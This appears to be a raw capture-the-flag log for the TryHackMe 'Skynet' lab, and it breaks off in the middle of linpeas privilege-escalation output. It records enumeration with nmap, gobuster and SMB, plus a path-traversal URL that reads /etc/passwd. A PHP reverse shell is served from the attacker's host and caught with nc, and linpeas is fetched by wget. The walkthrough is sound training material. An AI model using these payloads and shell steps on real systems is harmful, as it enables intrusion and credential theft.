@@ -1,0 +1,2086 @@
+RECON
+
+root@kali:~/tryhackme/skynet# nmap -sC -sV -Pn .166.138
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-25 10:04 EDT
+Nmap scan report for 10.10.166.138
+Host is up (0.013s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES CAPA PIPELINING TOP UIDL AUTH-RESP-CODE SASL
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: OK more capabilities IDLE IMAP4rev1 ENABLE post-login SASL-IR LOGINDISABLEDA0001 LOGIN-REFERRALS have listed LITERAL+ ID Pre-login
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 1s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2020-10-25T09:04:47-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-10-25 10:04:47
+|_  start_date: N/A
+
+
+ENUM
+root@kali:~/tryhackme/skynet# gobuster -u 10.10.166.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40 -a Linux
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.166.138/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] User Agent   : Linux
+[+] Extensions   : .php,.txt,.html
+=====================================================
+/index.html (Status: 200)
+/admin (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/config (Status: 301)
+/ai (Status: 301)
+/squirrelmail (Status: 301)
+
+http://10.10.166.138/squirrelmail/src/login.php
+
+SMB ENUM
+root@kali:~/tryhackme/skynet# smbclient //10.10.166.138/anonymous
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Sep 18 00:41:20 2019
+  ..                                  D        0  Tue Sep 17 03:20:17 2019
+  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
+  logs                                D        0  Wed Sep 18 00:42:16 2019
+  books                               D        0  Wed Sep 18 00:40:06 2019
+
+		9204224 blocks of size 1024. 5260800 blocks available
+smb: \> get attention.txt
+getting file \attention.txt of size 163 as attention.txt (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
+smb: \> cd logs
+smb: \logs\> ls
+  .                                   D        0  Wed Sep 18 00:42:16 2019
+  ..                                  D        0  Wed Sep 18 00:41:20 2019
+  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
+  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
+  log3.txt                            N        0  Wed Sep 18 00:42:16 2019
+
+		9204224 blocks of size 1024. 5260800 blocks available
+
+smb: \logs\> get log1.txt
+getting file \logs\log1.txt of size 471 as log1.txt (9.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
+smb: \logs\> get log2.txt
+getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 4.6 KiloBytes/sec)
+smb: \logs\> get log3.txt
+getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 3.7 KiloBytes/sec)
+smb: \logs\> 
+
+root@kali:~/tryhackme/skynet# enum4linux -a 10.10.166.138
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 25 12:54:33 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.166.138
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 10.10.166.138    |
+ ===================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================= 
+|    Nbtstat Information for 10.10.166.138    |
+ ============================================= 
+Looking up status of 10.10.166.138
+	SKYNET          <00> -         B <ACTIVE>  Workstation Service
+	SKYNET          <03> -         B <ACTIVE>  Messenger Service
+	SKYNET          <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ====================================== 
+|    Session Check on 10.10.166.138    |
+ ====================================== 
+[+] Server 10.10.166.138 allows sessions using username '', password ''
+
+ ============================================ 
+|    Getting domain SID for 10.10.166.138    |
+ ============================================ 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ======================================= 
+|    OS information on 10.10.166.138    |
+ ======================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.166.138 from smbclient: 
+[+] Got OS info for 10.10.166.138 from srvinfo:
+	SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+
+ ============================== 
+|    Users on 10.10.166.138    |
+ ============================== 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 
+
+user:[milesdyson] rid:[0x3e8]
+
+ ========================================== 
+|    Share Enumeration on 10.10.166.138    |
+ ========================================== 
+WARNING: The "syslog" option is deprecated
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	anonymous       Disk      Skynet Anonymous Share
+	milesdyson      Disk      Miles Dyson Personal Share
+	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
+
+SQUIRRELMAIL SAMBA PASSWORD IN EMAIL
+
+
+We have changed your smb password after system malfunction.
+Password: ################
+
+
+root@kali:~/tryhackme/skynet# smbclient -U 'milesdyson' //10.10.166.138/milesdyson
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\milesdyson's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Tue Sep 17 05:05:47 2019
+  ..                                  D        0  Tue Sep 17 23:51:03 2019
+  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
+  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
+  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
+  notes                               D        0  Tue Sep 17 05:18:40 2019
+  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
+  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019
+
+		9204224 blocks of size 1024. 5260628 blocks available
+smb: \> cd notes
+smb: \notes\> ls
+  .                                   D        0  Tue Sep 17 05:18:40 2019
+  ..                                  D        0  Tue Sep 17 05:05:47 2019
+  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
+  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
+  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
+  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
+  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
+  important.txt                       N      117  Tue Sep 17 05:18:39 2019
+  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
+  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
+  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
+  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
+  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
+  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
+  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
+  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
+  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
+  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
+  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
+  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
+  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
+  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
+  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
+  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
+  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
+  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
+  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
+  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
+  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
+  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
+  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
+  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
+  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
+  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
+  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
+  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
+  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
+  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
+  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019
+
+		9204224 blocks of size 1024. 5260628 blocks available
+smb: \notes\> get important.txt
+getting file \notes\important.txt of size 117 as important.txt (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
+smb: \notes\> exit
+root@kali:~/tryhackme/skynet# cat important.txt 
+
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+root@kali:~/tryhackme/skynet# python3 /root/dirsearch/dirsearch.py -u 10.10.166.138/45kra24zxs28v3yd -e php -x 403,404
+
+ _|. _ _  _  _  _ _|_    v0.3.9
+(_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6046
+
+Error Log: /root/dirsearch/logs/errors-20-10-25_14-04-32.log
+
+Target: 10.10.166.138/45kra24zxs28v3yd
+
+[14:04:32] Starting: 
+[14:04:36] 301 -  339B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.166.138/45kra24zxs28v3yd/administrator/
+[14:04:36] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php
+[14:04:36] 200 -    5KB - /45kra24zxs28v3yd/administrator/
+[14:04:39] 200 -  418B  - /45kra24zxs28v3yd/index.html
+
+
+EXPLOIT
+https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html
+https://www.exploit-db.com/exploits/41910
+
+SEARCH FOR CMS EXPLOIT
+https://www.exploit-db.com/exploits/25971
+
+LOCATE PHP REVERSE SHELL
+root@kali:~/tryhackme/skynet# cp /usr/share/webshells/php/php-reverse-shell.php .
+root@kali:~/tryhackme/skynet# cp php-reverse-shell.php shell.php
+
+ADD LOCAL IP AND LISTENING PORT
+root@kali:~/tryhackme/skynet# vim shell.php 
+root@kali:~/tryhackme/skynet# cp shell.php shell.txt 
+
+SHOW PASSWD FILE
+http://10.10.209.240/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 
+
+GET REVERSE SHELL
+root@kali:~/tryhackme/skynet# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.209.240 - - [25/Oct/2020 15:45:05] "GET /shell.txt HTTP/1.0" 200 -
+
+
+root@kali:~/tryhackme/skynet# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.209.240: inverse host lookup failed: Unknown host
+connect to [10.11.10.169] from (UNKNOWN) [10.10.166.138] 52664
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 14:45:05 up 26 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cat /home/milesdyson/user.txt
+########################
+
+PRIVESC
+$ pwd
+/
+$ cd /tmp
+$ wget http://10.11.10.169/linpeas.sh
+--2020-10-25 15:05:12--  http://10.11.10.169/linpeas.sh
+Connecting to 10.11.10.169:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 225747 (220K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... .......... 22%  240K 1s
+    50K .......... .......... .......... .......... .......... 45%  567K 0s
+   100K .......... .......... .......... .......... .......... 68%  395K 0s
+   150K .......... .......... .......... .......... .......... 90%  574K 0s
+   200K .......... ..........                                 100% 1.20M=0.5s
+
+2020-10-25 15:05:12 (418 KB/s) - 'linpeas.sh' saved [225747/225747]
+
+$ ls -l
+total 232
+-rw-rw-rw- 1 www-data www-data 225747 Oct 25 15:04 linpeas.sh
+drwx------ 3 root     root       4096 Oct 25 14:18 systemd-private-379f1687cfaf4de8b98859fe0e48799a-dovecot.service-IfzpGq
+drwx------ 3 root     root       4096 Oct 25 14:18 systemd-private-379f1687cfaf4de8b98859fe0e48799a-systemd-timesyncd.service-255wjI
+$ chmod 744 linpeas.sh
+$ ls -l
+total 232
+-rwxr--r-- 1 www-data www-data 225747 Oct 25 15:04 linpeas.sh
+drwx------ 3 root     root       4096 Oct 25 14:18 systemd-private-379f1687cfaf4de8b98859fe0e48799a-dovecot.service-IfzpGq
+drwx------ 3 root     root       4096 Oct 25 14:18 systemd-private-379f1687cfaf4de8b98859fe0e48799a-systemd-timesyncd.service-255wjI
+
+
+LINPEAS OUTPUT
+ ./linpeas.sh
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.6.1 by carlospolop
+
+ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: skynet
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
+Distributor ID:	Ubuntu
+Description:	Ubuntu 16.04.6 LTS
+Release:	16.04
+Codename:	xenial
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.16
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Sun Oct 25 15:06:12 CDT 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+udev            485M     0  485M   0% /dev
+tmpfs            99M  3.2M   96M   4% /run
+/dev/xvda1      8.8G  3.2G  5.2G  39% /
+tmpfs           495M     0  495M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           495M     0  495M   0% /sys/fs/cgroup
+              total        used        free      shared  buff/cache   available
+Mem:        1013760      207696       69784        8832      736280      592640
+Swap:        998396           0      998396
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+HISTSIZE=0
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+HISTFILE=/dev/null
+
+[+] Looking for Signature verification failed in dmseg
+ Not Found
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ uname: write error: Broken pipe
+grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+
+
+=========================================( Devices )==========================================
+[+] Any sd* disk in /dev? (limit 20)
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=a3e25baf-bf7f-418a-a691-679c054d8fea	/	ext4	errors=remount-ro	0 1
+UUID=354616bf-923c-43d3-a040-ae36babbbab3	none	swap	sw	0 0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+/bin/ping
+/usr/bin/gcc
+/usr/bin/g++
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+ii  g++                                   4:5.3.1-1ubuntu1                                         amd64        GNU C++ compiler
+ii  g++-5                                 5.4.0-6ubuntu1~16.04.11                                  amd64        GNU C++ compiler
+ii  gcc                                   4:5.3.1-1ubuntu1                                         amd64        GNU C compiler
+ii  gcc-5                                 5.4.0-6ubuntu1~16.04.11                                  amd64        GNU C compiler
+/usr/bin/gcc
+/usr/bin/g++
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+daemon     991  0.0  0.2  26044  2132 ?        Ss   14:18   0:00 /usr/sbin/atd -f
+dovecot   1091  0.0  0.0   9520   944 ?        S    14:18   0:00 dovecot/anvil
+message+   963  0.0  0.3  42896  3800 ?        Ss   14:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+mysql     1084  0.0 15.2 1108056 154252 ?      Ssl  14:18   0:00 /usr/sbin/mysqld
+postfix   1486  0.0  0.4  67472  4408 ?        S    14:18   0:00 pickup -l -t unix -u -c
+postfix   1487  0.0  0.4  67520  4564 ?        S    14:18   0:00 qmgr -l -t unix -u
+root         1  0.0  0.5 119632  5720 ?        Ss   14:18   0:02 /sbin/init
+root       408  0.0  0.2  28432  2792 ?        Ss   14:18   0:00 /lib/systemd/systemd-journald
+root       440  0.0  0.1  94772  1456 ?        Ss   14:18   0:00 /sbin/lvmetad -f
+root       469  0.0  0.3  42564  3800 ?        Ss   14:18   0:00 /lib/systemd/systemd-udevd
+root       732  0.0  1.5 337908 15836 ?        Ss   14:18   0:00 /usr/sbin/smbd -D
+root       744  0.0  0.5 329804  5724 ?        S    14:18   0:00 /usr/sbin/smbd -D
+root       771  0.0  0.2  16124  2616 ?        Ss   14:18   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+root       773  0.0  0.6 337908  6620 ?        S    14:18   0:00 /usr/sbin/smbd -D
+root       939  0.0  0.2  29008  3012 ?        Ss   14:18   0:00 /usr/sbin/cron -f
+root       958  0.0  0.6 275860  6212 ?        Ssl  14:18   0:00 /usr/lib/accountsservice/accounts-daemon
+root       988  0.0  0.3 613492  3904 ?        Ssl  14:18   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
+root       993  0.0  0.1   4392  1216 ?        Ss   14:18   0:00 /usr/sbin/acpid
+root      1000  0.0  0.1  20096  1124 ?        Ss   14:18   0:00 /lib/systemd/systemd-logind
+root      1012  0.0  0.5 277088  5984 ?        Ssl  14:18   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root      1025  0.0  0.0  13368   160 ?        Ss   14:18   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
+root      1077  0.0  0.2  18032  2704 ?        Ss   14:18   0:00 /usr/sbin/dovecot
+root      1079  0.0  0.5  65512  5396 ?        Ss   14:18   0:00 /usr/sbin/sshd -D
+root      1087  0.0  0.0   5216   148 ?        Ss   14:18   0:00 /sbin/iscsid
+root      1088  0.0  0.3   5716  3508 ?        S<Ls 14:18   0:00 /sbin/iscsid
+root      1092  0.0  0.2   9652  2328 ?        S    14:18   0:00 dovecot/log
+root      1098  0.0  0.3  20920  3480 ?        S    14:18   0:00 dovecot/config
+root      1179  0.0  0.2  15748  2204 ttyS0    Ss+  14:18   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
+root      1185  0.0  0.1  15932  1708 tty1     Ss+  14:18   0:00 /sbin/agetty --noclear tty1 linux
+root      1224  0.0  3.4 466648 35092 ?        Ss   14:18   0:00 /usr/sbin/apache2 -k start
+root      1304  0.0  0.5 240004  5900 ?        Ss   14:18   0:00 /usr/sbin/nmbd -D
+root      1305  0.0  0.7 286708  8048 ?        Ss   14:18   0:00 /usr/sbin/winbindd
+root      1306  0.0  0.6 286840  6560 ?        S    14:18   0:00 /usr/sbin/winbindd
+root      1485  0.0  0.4  65404  4400 ?        Ss   14:18   0:00 /usr/lib/postfix/sbin/master
+syslog     982  0.0  0.3 256392  3384 ?        Ssl  14:18   0:00 /usr/sbin/rsyslogd -n
+systemd+   600  0.0  0.2 100320  2576 ?        Ssl  14:18   0:00 /lib/systemd/systemd-timesyncd
